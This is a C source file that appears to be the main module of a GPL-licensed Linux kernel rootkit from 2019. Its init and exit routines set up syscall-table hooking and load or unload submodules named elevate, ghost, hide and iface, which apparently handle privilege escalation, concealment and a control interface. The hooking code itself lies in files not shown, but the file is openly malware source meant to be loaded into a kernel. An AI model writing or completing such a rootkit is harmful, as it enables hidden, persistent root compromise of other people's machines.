/*
Copyright (C) 2019 Bailey Defino
<https://bdefino.github.io>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/
#include "rootkit.h"

/* rootkit */

static struct sctm rootkit__sctm;

static void __exit rootkit_exit(void) {
  int retval;

#ifdef DEBUG
  ROOTKIT_DEBUG(("rootkit_exit()"));
#endif
  retval = elevate_exit();

#ifdef DEBUG
  if (retval)
    ROOTKIT_ERROR(("elevate_exit() -> %d\n", retval));
#endif
  retval = ghost_exit();
  
#ifdef DEBUG
  if (retval)
    ROOTKIT_ERROR(("ghost_exit() -> %d\n", retval));
#endif
  retval = hide_exit();

#ifdef DEBUG
  if (retval)
    ROOTKIT_ERROR(("hide_exit() -> %d\n", retval));
#endif
  retval = iface_exit();
  
#ifdef DEBUG
  if (retval)
    ROOTKIT_ERROR(("iface_exit() -> %d\n", retval));
#endif

  /* remove all remaining hooks */
  
  retval = sctm_cleanup(&rootkit__sctm);

#ifdef DEBUG
  if (retval)
    ROOTKIT_ERROR(("sctm_cleanup(&rootkit__sctm) -> %d\n", retval));
#endif
}

static int __init rootkit_init(void) {
  int retval;

#ifdef DEBUG
  ROOTKIT_DEBUG(("rootkit_init())");
#endif
  
  retval = sctm_init(&rootkit__sctm);
  
  if (retval) {
#ifdef DEBUG
    ROOTKIT_ERROR(("sctm_init(&rootkit__sctm) -> %d\n", retval));
#endif
    return retval;
  }
  retval = elevate_init(&rootkit__sctm);

  if (retval) {
#ifdef DEBUG
    ROOTKIT_ERROR(("elevate_init(&rootkit__sctm) -> %d\n", retval));
#endif
    return retval;
  }
  retval = ghost_init(&rootkit__sctm);
  
  if (retval) {
#ifdef DEBUG
    ROOTKIT_ERROR(("ghost_init(&rootkit__sctm) -> %d\n", retval));
#endif
    return retval;
  }
  retval = hide_init(&rootkit__sctm);

  if (retval) {
#ifdef DEBUG
    ROOTKIT_ERROR(("hide_init(&rootkit__sctm) -> %d\n", retval));
#endif
    return retval;
  }
  retval = iface_init(&rootkit__sctm);
  
#ifdef DEBUG
  if (retval)
    ROOTKIT_ERROR(("iface_init(&rootkit__sctm) -> %d\n", retval));
#endif
  return retval;
}

module_exit(rootkit_exit)
module_init(rootkit_init)

MODULE_LICENSE("GPL");

